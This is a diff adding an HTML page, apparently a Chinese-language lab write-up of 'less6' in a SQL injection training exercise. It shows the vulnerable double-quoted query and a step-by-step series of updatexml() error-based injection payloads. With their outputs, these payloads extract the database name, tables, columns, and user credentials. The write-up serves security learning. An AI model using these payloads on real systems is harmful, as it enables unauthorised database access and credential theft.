@@ -1,0 +1,34 @@
+<hr>
+<h2 id="title-less6url-https-www-yuque-com-u29002979-ep2zrx-dwu3xvhhfplpb1gg"><a href="#title-less6url-https-www-yuque-com-u29002979-ep2zrx-dwu3xvhhfplpb1gg" class="headerlink" title="title: less6url: https://www.yuque.com/u29002979/ep2zrx/dwu3xvhhfplpb1gg"></a>title: less6<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/dwu3xvhhfplpb1gg">https://www.yuque.com/u29002979/ep2zrx/dwu3xvhhfplpb1gg</a></h2><pre><code class="bash">$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre>
+<p><code>?id=1&quot;</code></p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>less6与less5的唯一区别在于闭合方式为双引号”\ <a name="MK1Je"></a></p>
+<h1 id="用updatexml-函数进行报错注入"><a href="#用updatexml-函数进行报错注入" class="headerlink" title="用updatexml()函数进行报错注入"></a>用updatexml()函数进行报错注入</h1><p>updatexml(1,1,1) <a name="nAWtm"></a></p>
+<h2 id="查看数据库名称"><a href="#查看数据库名称" class="headerlink" title="查看数据库名称"></a>查看数据库名称</h2><p><code>?id=1&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
+<blockquote>
+<p>XPATH syntax error: ‘~security’</p>
+</blockquote>
+<p><a name="CeOmH"></a></p>
+<h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=1&quot; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
+<blockquote>
+<p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘</p>
+</blockquote>
+<p><a name="vqZkZ"></a></p>
+<h2 id="查看字段名称"><a href="#查看字段名称" class="headerlink" title="查看字段名称"></a>查看字段名称</h2><p><code>?id=1&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),0x7e),1)--+</code></p>
+<blockquote>
+<p>XPATH syntax error: ‘<del>id,username,password</del>‘</p>
+</blockquote>
+<p><a name="dltOi"></a></p>
+<h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=1&quot; or updatexml(1,concat(0x7e,(select group_concat(concat(username,&#39; ^ &#39;,password)) from users),0x7e),1)--+</code></p>
+<blockquote>
+<p>XPATH syntax error: ‘~Dumb ^ Dumb,Angelina ^ I-kill-y’</p>
+</blockquote>
+<p>substring(1,2,3)<br><code>?id=1&quot; or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,&#39; ^ &#39;,password)) from users),32,31),0x7e),1)--+</code></p>
+<blockquote>
+<p>XPATH syntax error: ‘~ou,Dummy ^ p@ssword,secure ^ cr’</p>
+</blockquote>
+<p>……</p>
